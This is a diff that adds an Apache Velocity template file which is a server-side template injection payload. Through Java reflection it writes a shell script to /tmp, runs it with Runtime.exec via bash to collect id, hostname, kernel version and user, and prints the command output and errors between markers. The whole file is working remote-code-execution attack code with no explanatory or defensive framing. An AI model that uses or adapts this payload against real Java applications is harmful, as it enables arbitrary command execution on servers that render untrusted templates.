@@ -1,0 +1,13 @@
+#set($x = "")
+#set($fw = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
+$fw.write("id; hostname; uname -r; whoami")
+$fw.close()
+#set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
+#set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
+#set($o = $x.getClass().forName("org.apache.commons.io.IOUtils").getMethod("toString", $x.getClass().forName("java.io.InputStream")).invoke(null, $p.getInputStream()))
+#set($e = $x.getClass().forName("org.apache.commons.io.IOUtils").getMethod("toString", $x.getClass().forName("java.io.InputStream")).invoke(null, $p.getErrorStream()))
+OUT_START
+$o
+ERR_START
+$e
+OUT_END
